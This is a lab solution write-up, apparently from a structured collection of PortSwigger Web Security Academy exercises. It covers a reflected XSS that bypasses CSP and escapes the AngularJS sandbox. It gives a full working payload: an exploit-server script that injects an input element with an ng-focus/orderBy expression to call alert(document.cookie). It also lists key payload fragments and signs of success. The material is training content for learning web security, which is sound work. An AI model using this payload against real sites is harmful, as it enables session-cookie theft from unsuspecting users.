## Reflected XSS with AngularJS sandbox escape and CSP

**Category:** xss_reflected
**Difficulty:** Unknown

### Description
To solve the lab, perform a cross-site scripting attack that bypasses CSP, escapes the AngularJS sandbox, and alertsdocument.cookie.

### Solution Steps
1. Go to the exploit server and paste the following code, replacing YOUR-LAB-ID with your lab ID: <script>
location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>
2. Click "Store" and "Deliver exploit to victim".

### Key Payloads
- `document.cookie`
- `YOUR-LAB-ID`
- `<script>
location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>`
- `ng-focus`
- `$event`
- `path`
- `window`
- `orderBy`
- `alert`
- `$event.path`

### Indicators of Success
- Payload reflected in response without encoding
- `<script>` tags rendered as HTML elements
- JavaScript alert/print executes in browser
- DOM shows injected elements
- No WAF block or sanitization
---
*Source: PortSwigger Web Security Academy*
